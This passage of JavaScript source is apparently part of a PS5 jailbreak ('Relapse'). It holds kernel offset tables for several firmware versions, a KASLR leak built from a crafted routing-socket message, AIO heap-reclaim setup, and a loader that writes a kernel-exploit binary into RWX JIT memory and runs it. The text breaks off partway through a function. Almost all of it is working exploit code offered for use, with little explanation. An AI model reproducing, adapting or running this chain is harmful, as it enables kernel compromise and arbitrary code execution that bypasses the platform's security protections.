        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "12.70": {
        kernelData: 0x00D50000n, allproc: 0x035D5E00n, rootvnode: 0x03E27510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00B6EB51n, retLow16: 0xEB51n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x0294B408n, kind: 0x0294B41Cn, kindByte3: 0x0294B41Fn, arg1: 0x0294B420n, arg1Byte1: 0x0294B421n, arg1Value: 0x0294B3F8n, deadSink: 0x0294B428n },
            b: { base: 0x0294B2E0n, kind: 0x0294B2F4n, kindByte3: 0x0294B2F7n, arg1: 0x0294B2F8n, arg1Value: 0x0294B210n, visible: 0x0294B330n },
            c: { base: 0x02C6E108n, kind: 0x02C6E11Cn, arg1: 0x02C6E120n, arg1Value: 0x03DA32BCn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03DA32B8n, mib: [9, 7] },
        nodeMutex: 0x01B1AB78n,
        rodataProbe: { rva: 0x011C86D5n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c48n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "13.00": {
        kernelData: 0x00CB0000n, allproc: 0x03575E00n, rootvnode: 0x03DE3510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00AD8582n, retLow16: 0x8582n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x028BEC88n, kind: 0x028BEC9Cn, kindByte3: 0x028BEC9Fn, arg1: 0x028BECA0n, arg1Byte1: 0x028BECA1n, arg1Value: 0x028BEC78n, deadSink: 0x028BECA8n },
            b: { base: 0x028BEB60n, kind: 0x028BEB74n, kindByte3: 0x028BEB77n, arg1: 0x028BEB78n, arg1Value: 0x028BEA90n, visible: 0x028BEBB0n },
            c: { base: 0x02BE1958n, kind: 0x02BE196Cn, arg1: 0x02BE1970n, arg1Value: 0x03D5E73Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03D5E738n, mib: [9, 7] },
        nodeMutex: 0x01A8BA78n,
        rodataProbe: { rva: 0x013678A5n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0BCn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0C48n, dynlib: 0x3E8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0Cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0Cn, buffer: 0x10n, pair: 0xE8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xF0n, syscallEnd: 0xF8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "13.20": {
        kernelData: 0x00CB0000n, allproc: 0x03575E00n, rootvnode: 0x03DE3510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00AD8790n, retLow16: 0x8790n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x028BEC88n, kind: 0x028BEC9Cn, kindByte3: 0x028BEC9Fn, arg1: 0x028BECA0n, arg1Byte1: 0x028BECA1n, arg1Value: 0x028BEC78n, deadSink: 0x028BECA8n },
            b: { base: 0x028BEB60n, kind: 0x028BEB74n, kindByte3: 0x028BEB77n, arg1: 0x028BEB78n, arg1Value: 0x028BEA90n, visible: 0x028BEBB0n },
            c: { base: 0x02BE1958n, kind: 0x02BE196Cn, arg1: 0x02BE1970n, arg1Value: 0x03D5E73Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03D5E738n, mib: [9, 7] },
        nodeMutex: 0x01A8BA78n,
        rodataProbe: { rva: 0x01367C97n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c48n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "13.40": {
        kernelData: 0x00CB0000n, allproc: 0x03579E80n, rootvnode: 0x03DE7510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00AD8AA0n, retLow16: 0x8AA0n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x028BEE88n, kind: 0x028BEE9Cn, kindByte3: 0x028BEE9Fn, arg1: 0x028BEEA0n, arg1Byte1: 0x028BEEA1n, arg1Value: 0x028BEE78n, deadSink: 0x028BEEA8n },
            b: { base: 0x028BED60n, kind: 0x028BED74n, kindByte3: 0x028BED77n, arg1: 0x028BED78n, arg1Value: 0x028BEC90n, visible: 0x028BEDB0n },
            c: { base: 0x02BE1B58n, kind: 0x02BE1B6Cn, arg1: 0x02BE1B70n, arg1Value: 0x03D6273Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03D62738n, mib: [9, 7] },
        nodeMutex: 0x01A8BAB8n,
        rodataProbe: { rva: 0x01367A24n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c48n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "13.42": {
        kernelData: 0x00CB0000n, allproc: 0x03579E80n, rootvnode: 0x03DE7510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00AD8AA0n, retLow16: 0x8AA0n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x028BEE88n, kind: 0x028BEE9Cn, kindByte3: 0x028BEE9Fn, arg1: 0x028BEEA0n, arg1Byte1: 0x028BEEA1n, arg1Value: 0x028BEE78n, deadSink: 0x028BEEA8n },
            b: { base: 0x028BED60n, kind: 0x028BED74n, kindByte3: 0x028BED77n, arg1: 0x028BED78n, arg1Value: 0x028BEC90n, visible: 0x028BEDB0n },
            c: { base: 0x02BE1B58n, kind: 0x02BE1B6Cn, arg1: 0x02BE1B70n, arg1Value: 0x03D6273Cn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03D62738n, mib: [9, 7] },
        nodeMutex: 0x01A8BAB8n,
        rodataProbe: { rva: 0x01367E06n, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c48n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },

    "13.60": {
        kernelData: 0x00CC0000n, allproc: 0x03589E80n, rootvnode: 0x03E0B510n,
        kaslr: { mode: "rtmsg2", retStatic: 0x00AE2DA0n, retLow16: 0x2DA0n },
        oid: {
            originalKind: 0x80048002n, writableKind: 0x70048002n,
            a: { base: 0x028cef68n, kind: 0x028cef7cn, kindByte3: 0x028cef7fn, arg1: 0x028cef80n, arg1Byte1: 0x028cef81n, arg1Value: 0x028cef58n, deadSink: 0x028cef88n },
            b: { base: 0x028cee40n, kind: 0x028cee54n, kindByte3: 0x028cee57n, arg1: 0x028cee58n, arg1Value: 0x028ced70n, visible: 0x028cee90n },
            c: { base: 0x02bf1c38n, kind: 0x02bf1c4cn, arg1: 0x02bf1c50n, arg1Value: 0x03d831bcn, mib: [9, 8] },
        },
        walkCounter: { addr: 0x03d831b8n, mib: [9, 7] },
        nodeMutex: 0x01a9bab8n,
        rodataProbe: { rva: 0x01379d6cn, text: "_aio_submit_cmd\0_aio_multi_wait" },
        aio: { waiterSize: 0x38n, requestSize: 0x28n, group: { num: 0x00n, state: 0x08n, waiters: 0x50n }, idTable: { pages: 0x220n, slotStride: 0x30n, entryType: 0x160n } },
        proc: { pid: 0x0bcn, ucred: 0x040n, fd: 0x048n, aioInfo: 0x0c48n, dynlib: 0x3e8n },
        kernelPid: 0n,
        ucred: { uid: 0x04n, ruid: 0x08n, svuid: 0x0cn, ngroups: 0x10n, rgid: 0x14n, svgid: 0x18n, sceAuthId: 0x58n, sceCaps: 0x60n, sceCaps1: 0x68n, sceAttrs: 0x80n },
        sysCoreAuthId: { lo: 0x00000007n, hi: 0x48000000n },
        filedesc: { files: 0x00n, cdir: 0x08n, rdir: 0x10n, jdir: 0x18n },
        filedescTable: { nfiles: 0x00n, ofiles: 0x08n, entryStride: 0x30n, fileData: 0x00n },
        pipe: { count: 0x00n, "in": 0x04n, out: 0x08n, size: 0x0cn, buffer: 0x10n, pair: 0xe8n, defaultSize: 0x4000n },
        dynlib: { syscallStart: 0xf0n, syscallEnd: 0xf8n, restrictFlags: 0x118n, libkernelRef: 0x18n },
    },
};

function get_relapse_offset(fw) {
    fw = fw || FW_VERSION;
    return RELAPSE_OFFSETS[fw] || null;
}


const kexp = (function () {
    const MAX_ELFLDR_SIZE = 0x1000000n;

    function align_up(n, align) {
        return (n + align - 1) & ~(align - 1);
    }

    function find_payload_file(filename) {
        if (typeof find_file === "function") {
            const p = find_file(filename);
            if (p) return p;
        }
        for (let n = 0; n <= 2; n++) {
            const path = "/mnt/sandbox/" + TITLE_ID + "_00" + n +
                "/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY=/" + filename;
            if (file_exists(path)) return path;
        }
        return null;
    }

    function read_native_file(ctx, path) {
        const path_addr = alloc_string(path);
        const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);
        if (BigInt.asIntN(64, fd) < 0n) throw new Error("Kernel: could not open " + path);

        try {
            const stat_addr = ctx.native_malloc(0x100);
            const stat_result = BigInt.asIntN(64, syscall(SYSCALL.fstat, fd, stat_addr));
            if (stat_result !== 0n) throw new Error("Kernel: fstat failed for " + path);

            const size = read64(stat_addr + 0x48n);
            if (size < 0x1000n || size > MAX_ELFLDR_SIZE)
                throw new Error("Kernel: invalid elfldr size: " + size);

            const buffer = ctx.native_malloc(size);
            let offset = 0n;
            while (offset < size) {
                const remaining = size - offset;
                const count = BigInt.asIntN(64,
                    syscall(SYSCALL.read, fd, buffer + offset, remaining));
                if (count <= 0n || count > remaining)
                    throw new Error("Kernel: short read for " + path + " at " + offset);
                offset += count;
            }

            return { buffer, size };
        } finally {
            syscall(SYSCALL.close, fd);
        }
    }

    function is_user_address(addr) {
        return addr > 0n && addr < 0x0000800000000000n;
    }

    async function launch(ctx) {
        ctx.restore_thread_attributes();

        if (typeof ctx.native_malloc !== "function") {
            await ctx.report("Kernel: native buffer allocator is unavailable");
            return false;
        }

        if (!ctx.kbase || !ctx.proc_fd_addr) {
            await ctx.report("Kernel: kernel r/w is incomplete");
            return false;
        }

        const allproc = ctx.kaddr(ctx.off.allproc);
        if ((allproc >> 48n) !== 0xffffn || (allproc & 7n) !== 0n) {
            await ctx.report("Kernel: allproc address is invalid: " + ctx.hex(allproc));
            return false;
        }

        let elfldr_path = find_payload_file(ELFLDR_FILE);
        if (!elfldr_path) elfldr_path = find_payload_file("elfldr-ps5.elf");
        if (!elfldr_path) elfldr_path = find_payload_file("elfldr.elf");
        if (!elfldr_path) { await ctx.report("Kernel: elfldr payload does not exist (" + ELFLDR_FILE + ")"); return false; }
        const elfldr_file = read_native_file(ctx, elfldr_path);
        const elfldr_ptr = elfldr_file.buffer;
        const elfldr_size = elfldr_file.size;
        if (Number(read8(elfldr_ptr)) !== 0x7f ||
            Number(read8(elfldr_ptr + 1n)) !== 0x45 ||
            Number(read8(elfldr_ptr + 2n)) !== 0x4c ||
            Number(read8(elfldr_ptr + 3n)) !== 0x46) {
            await ctx.report("Kernel: elfldr image has invalid ELF magic");
            return false;
        }

        let kexp_path = find_payload_file(KEXP_FILE);
        if (!kexp_path) kexp_path = find_payload_file("kexp.bin");
        if (!kexp_path) { await ctx.report("Kernel: kexp payload does not exist (" + KEXP_FILE + ")"); return false; }
        const kexp_data = read_file(kexp_path);
        if (!kexp_data || kexp_data.length < 0x1000) {
            await ctx.report("Kernel: kexp binary has an invalid size");
            return false;
        }
        const kexp_aligned_size = align_up(kexp_data.length, PAGE_SIZE);

        const exec_fd = syscall(SYSCALL.jitshm_create, 0n, BigInt(kexp_aligned_size), PROT_RWX);
        if (exec_fd === 0xffffffffffffffffn || exec_fd < 0n || exec_fd >= 0x100000n) {
            await ctx.report("Kernel: jitshm_create failed: " + ctx.hex(exec_fd));
            return false;
        }

        let entry_addr = syscall(SYSCALL.mmap, 0n, BigInt(kexp_aligned_size), PROT_RWX,
            MAP_SHARED, exec_fd, 0n);
        if (!is_user_address(entry_addr)) {
            const alias_fd = syscall(SYSCALL.jitshm_alias, exec_fd, PROT_READ | PROT_WRITE);
            if (alias_fd === 0xffffffffffffffffn || alias_fd < 0n || alias_fd >= 0x100000n) {
                await ctx.report("Kernel: jitshm_alias failed: " + ctx.hex(alias_fd));
                return false;
            }
            const writable = syscall(SYSCALL.mmap, 0n, BigInt(kexp_aligned_size),
                PROT_READ | PROT_WRITE, MAP_SHARED, alias_fd, 0n);
            if (!is_user_address(writable)) {
                await ctx.report("Kernel: writable shellcode mmap failed: " + ctx.hex(writable));
                return false;
            }
            write_buffer(writable, kexp_data);
            entry_addr = syscall(SYSCALL.mmap, 0n, BigInt(kexp_aligned_size), PROT_RWX,
                MAP_SHARED, exec_fd, 0n);
            if (!is_user_address(entry_addr)) {
                await ctx.report("Kernel: executable shellcode mmap failed: " + ctx.hex(entry_addr));
                return false;
            }
        } else {
            write_buffer(entry_addr, kexp_data);
        }

        const args = ctx.native_malloc(0x40);
        for (let i = 0n; i < 0x40n; i += 8n) write64(args + i, 0n);
        write32(args + 0x00n, ctx.master.read_fd);
        write32(args + 0x04n, ctx.master.write_fd);
        write32(args + 0x08n, ctx.victim.read_fd);
        write32(args + 0x0cn, ctx.victim.write_fd);
        write64(args + 0x10n, allproc);
        write64(args + 0x18n, elfldr_ptr);
        write64(args + 0x20n, elfldr_size);

        if (typeof Thrd_create !== "bigint" || typeof Thrd_join !== "bigint") {
            await ctx.report("Kernel: Y2JB thread entry points are unavailable");
            return false;
        }

        const thr_handle_addr = ctx.native_malloc(8);
        write64(thr_handle_addr, 0n);
        const created = call(Thrd_create, thr_handle_addr, entry_addr, args);
        if (created !== 0n) {
            await ctx.report("Kernel: Thrd_create returned " + ctx.hex(created));
            return false;
        }

        const thr_handle = read64(thr_handle_addr);
        if (!thr_handle) {
            await ctx.report("Kernel: Thrd_create returned an empty thread handle");
            return false;
        }

        const result_addr = ctx.native_malloc(8);
        write64(result_addr, 0n);
        const joined = call(Thrd_join, thr_handle, result_addr);
        if (joined !== 0n) {
            await ctx.report("Kernel: Thrd_join returned " + ctx.hex(joined));
            return false;
        }

        await ctx.stage("kexp: elfldr returned " + ctx.hex(read64(result_addr)));
        return true;
    }

    function bump_refcount(file_addr, kread32_fn, kwrite32_fn) {
        const read = kread32_fn(file_addr + 0x28n);
        if (read.rv !== 0n) return false;
        return kwrite32_fn(file_addr + 0x28n, read.value + 0x100) === 0n;
    }

    return { launch, bump_refcount };
})();


async function start_relapse() {
    // fall back to anonymous mmap when malloc returns a tagged pointer.
    function alloc(size) {
        const bytes = BigInt(size);
        const raw = BigInt(malloc(bytes));
        if (raw > 0n && raw < 0x0000800000000000n) return raw;

        const page_size = BigInt(PAGE_SIZE);
        const map_size = (bytes + page_size - 1n) & ~(page_size - 1n);
        const mapped = syscall(SYSCALL.mmap, 0n, map_size, PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS, 0xffffffffffffffffn, 0n);
        if (mapped <= 0n || mapped >= 0x0000800000000000n)
            throw new Error("native buffer allocation failed");
        return mapped;
    }


    try {
        if (typeof is_jailbroken === "function" && is_jailbroken()) {
            await log("[*] Process is already jailbroken, nothing to do");
            send_notification("Already Jailbroken");
            return false;
        }

        await log("[+] Relapse port by notmaj0r");
        await log("[+] Credits: ntfargo, ufm42, Sonic_Iso, Jordy, Dr. Yenyen, TheFlow, SlidyBat, Flatz, " +
            "cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion, matem6, edisnord");

        let off = get_relapse_offset(FW_VERSION);
        if (!off) {
            await log("[-] Firmware " + FW_VERSION + " is not supported");
            send_notification("[ERROR] Firmware " + FW_VERSION + " unsupported");
            return false;
        }
        await log("[+] Firmware " + FW_VERSION);

        const AF_UNIX = 1n;
        const AF_ROUTE = 17n;
        const SOCK_RAW = 3n;
        const MSG_DONTWAIT = 0x80n;
        const RLIMIT_NOFILE = 8n;
        const CPU_LEVEL_WHICH = 3n;
        const CPU_WHICH_TID = 1n;
        const RTP_SET = 1n;
        const PRI_REALTIME = 2n;
        const PRI_NORMAL = 3n;
        const AIO_CMD_READ = 1n;
        const F_SETFL = 4n;

        const tuning = {
            waiters: 18, requests: 13,
            churnBefore: 32, churnAfter: 256, sprays: 64,
            workerBlockers: 24, waitTimeoutUs: 10000,
        };

        let kbase = 0n;
        let curproc = 0n;
        let ucred_addr = 0n;
        let proc_fd_addr = 0n;
        let master = null, victim = null;
        let worker_park = null;
        let fds = [];
        let window_high = 0xffffffffn;
        let armed_groups = [];
        let mib_a = null, mib_b = null, mib_c = null;
        let pipe_size = 0n;
        let saved_pipe_buffers = null;
        let aim_buffer = 0n, drain_buffer = 0n;
        let crossed = false;
        let pinned_core = -1;
        let allowed_mask = 0;
        let thread_attrs_restored = false;
        let eboot_segments_ptr = 0n, eboot_orig_addr = 0n, eboot_orig_size = 0n;
        let handoff_ready = false;
        let orig_escalation = null;

        const scratch_states = alloc(0x400);
        const scratch_qword = alloc(8);

        function stage(msg) { if (typeof window !== "undefined" && typeof window.uiLog === "function") window.uiLog("[*] " + msg); return log("[*] " + msg); }
        function ok_msg(msg) { if (typeof window !== "undefined" && typeof window.uiLog === "function") window.uiLog("[+] " + msg); return log("[+] " + msg); }
        function warn(msg) { if (typeof window !== "undefined" && typeof window.uiLog === "function") window.uiLog("[-] " + msg); return log("[-] " + msg); }

        function kaddr(rva) { return kbase + rva; }

        function sysnum(sysno, ...args) {
            return BigInt.asIntN(64, syscall(sysno, ...args));
        }

        function is_kernel_pointer(v) {
            if (v === null || v === undefined) return false;
            if (v === 0xffffffffffffffffn) return false;
            return (v >> 48n) === 0xffffn && (v & 7n) === 0n;
        }

        // sysctl

        function do_sysctl(mib, old_ptr, old_len, new_ptr, new_len) {
            const mib_buf = alloc(4 * mib.length);
            for (let i = 0; i < mib.length; i++) write32(mib_buf + BigInt(i * 4), BigInt(mib[i]));
            const len_buf = alloc(8);
            if (old_ptr) write64(len_buf, BigInt(old_len || 0));
            const rv = sysnum(SYSCALL.sysctl, mib_buf, BigInt(mib.length),
                old_ptr || 0n, old_ptr ? len_buf : 0n, new_ptr || 0n, BigInt(new_len || 0));
            const len = old_ptr ? Number(read64(len_buf)) : 0;
            return { rv, len };
        }

        function sysctl_read_int(mib) {
            const buf = alloc(8);
            const { rv } = do_sysctl(mib, buf, 4, 0n, 0);
            return { rv, value: Number(read32(buf)) };
        }

        function sysctl_write_int(mib, value) {
            const buf = alloc(8);
            write32(buf, BigInt(value) & 0xffffffffn);
            return do_sysctl(mib, 0n, 0, buf, 4).rv;
        }

        function name_to_mib(name) {
            const name_buf = alloc(name.length + 1);
            for (let i = 0; i < name.length; i++)
                write8(name_buf + BigInt(i), BigInt(name.charCodeAt(i) & 0xff));
            write8(name_buf + BigInt(name.length), 0n);
            const out = alloc(0x60);
            const { rv, len } = do_sysctl([0, 3], out, 0x60, name_buf, name.length);
            if (rv !== 0n) return null;

            const mib = [];
            for (let i = 0; i < Math.floor(len / 4); i++) {
                mib.push(Number(read32(out + BigInt(i * 4))));
            }
            return mib;
        }

        function oid_kind(mib) {
            const out = alloc(0x100);
            const { rv } = do_sysctl([0, 4].concat(mib), out, 0x100, 0n, 0);
            if (rv !== 0n) return null;
            return Number(read32(out));
        }

        // thread affinity

        function pin_to_single_core() {
            const current = alloc(0x10);
            syscall(SYSCALL.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, -1n, 0x10n, current);
            const allowed = Number(read32(current));
            allowed_mask = allowed;

            let core = -1;
            for (let c = 0; c < 16; c++) {
                if ((allowed & (1 << c)) !== 0) { core = c; break; }
            }
            if (core < 0) { warn("pin: no allowed core in mask 0x" + allowed.toString(16)); return; }

            const mask = alloc(0x10);
            write8(mask + BigInt((core >> 3) & 0xf), BigInt(1 << (core & 7)));
            syscall(SYSCALL.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, -1n, 0x10n, mask);

            const rtprio = alloc(0x10);
            write16(rtprio, PRI_REALTIME);
            write16(rtprio + 2n, 0n);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);

            pinned_core = core;
        }

        function restore_thread_attributes() {
            if (thread_attrs_restored) return;
            const want = allowed_mask || 0xea00;

            const mask = alloc(0x10);
            write8(mask, BigInt(want & 0xff));
            write8(mask + 1n, BigInt((want >> 8) & 0xff));
            syscall(SYSCALL.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, -1n, 0x10n, mask);

            const rtprio = alloc(0x10);
            write16(rtprio, PRI_NORMAL);
            write16(rtprio + 2n, 0n);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);

            thread_attrs_restored = true;
        }

        // kaslr leak

        function sockaddr_len(len) {
            if (len && len !== 0) return ((len - 1) & ~7) + 8;
            return 8;
        }

        function first_interface_address() {
            const RECORD = 0x3c0, IP = 40;
            const count = Number(sysnum(SYSCALL.netgetiflist, 0n, 10n));
            if (count <= 0 || count > 256) return null;

            const list = alloc(RECORD * count);
            if (sysnum(SYSCALL.netgetiflist, list, BigInt(count)) < 0n) return null;

            for (let i = 0; i < count; i++) {
                let nonzero = false;
                const octets = [];
                for (let b = 0; b < 4; b++) {
                    const o = Number(read8(list + BigInt(RECORD * i + IP + b)));
                    octets.push(o);
                    if (o !== 0) nonzero = true;
                }
                if (nonzero) return octets;
            }
            return null;
        }

        function leak_kernel_base() {
            const DST_LEN = 88;
            const AUTHOR = 152 + sockaddr_len(DST_LEN);
            const MSG_LEN = AUTHOR + 256;
            const AUTHOR_INDEX = 6;
            const RET_SLOT = 184;

            const dst = first_interface_address();
            if (!dst) throw new Error("kaslr: no interface has an address");

            const fd = sysnum(SYSCALL.socket, AF_ROUTE, SOCK_RAW, 0n);
            if (fd < 0n) throw new Error("kaslr: routing socket is gated");
            fds.push(fd);

            const timeout = alloc(16);
            write32(timeout, 5n);
            sysnum(SYSCALL.setsockopt, fd, 0xffffn, 0x20n, timeout, 16n);

            const msg = alloc(512);
            write8(msg, BigInt(MSG_LEN & 0xff));
            write8(msg + 1n, BigInt((MSG_LEN >> 8) & 0xff));
            write8(msg + 2n, 5n);
            write8(msg + 3n, 0x04n);
            write32(msg + 12n, 0x41n);
            write32(msg + 20n, 0x1234n);
            write8(msg + 152n, BigInt(DST_LEN));
            write8(msg + 153n, AF_INET);
            write32(msg + 156n, BigInt(((dst[3] << 24) | (dst[2] << 16) | (dst[1] << 8) | dst[0]) >>> 0));
            write8(msg + BigInt(AUTHOR), 255n);
            write8(msg + BigInt(AUTHOR + 1), AF_INET6);

            if (sysnum(SYSCALL.write, fd, msg, BigInt(MSG_LEN)) < 0n) {
                throw new Error("kaslr: routing socket rejected the request");
            }

            const reply = alloc(4096);
            let len = 0n;
            for (let attempt = 0; attempt < 8; attempt++) {
                len = sysnum(SYSCALL.recvfrom, fd, reply, 4096n, MSG_DONTWAIT, 0n, 0n);
                if (len > 0n) break;
                nanosleep(1000000);
            }
            if (len <= 0n) throw new Error("kaslr: no routing reply");

            const present = Number(read32(reply + 12n));
            let cursor = 152, author = 0;
            for (let i = 0; i < 8; i++) {
                if ((present & (1 << i)) !== 0) {
                    if (cursor + 2 > Number(len)) break;
                    if (i === AUTHOR_INDEX) { author = cursor; break; }
                    cursor += sockaddr_len(Number(read8(reply + BigInt(cursor))));
                }
            }
            if (author === 0 || author + 200 > Number(len)) {
                throw new Error("kaslr: reply carries no author record");
            }

            const ret = read64(reply + BigInt(author + RET_SLOT));
            if ((ret >> 32n) !== 0xffffffffn || (ret & 0xffffn) !== (off.kaslr.retLow16 & 0xffffn)) {
                throw new Error("kaslr: author+" + RET_SLOT + " = " + toHex(ret) + " is not the expected return address");
            }

            const retLow32 = ret & 0xffffffffn;
            kbase = (ret & 0xffffffff00000000n) | ((retLow32 - off.kaslr.retStatic) & 0xffffffffn);
        }

        // aio reclaim

        function raise_fd_limit() {
            const limit = alloc(0x10);
            if (sysnum(SYSCALL.getrlimit, RLIMIT_NOFILE, limit) === -1n) return;
            write64(limit, read64(limit + 8n));
            sysnum(SYSCALL.setrlimit, RLIMIT_NOFILE, limit);
        }

        function open_socket_pair(error_message) {
            const buffer = alloc(8);
            if (sysnum(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, buffer) === -1n) {
                throw new Error(error_message);
            }
            const pair = { read_fd: read32(buffer), write_fd: read32(buffer + 4n) };
            fds.push(pair.read_fd, pair.write_fd);
            return pair;
        }

        function submit_blocked_read(read_fd) {
            const request = alloc(0x40);
            const sink = alloc(0x40);
            const id_out = alloc(8);
            for (let i = 0n; i < 0x40n; i += 8n) write64(request + i, 0n);
            write32(request + 0x08n, 1n);
            write64(request + 0x10n, sink);
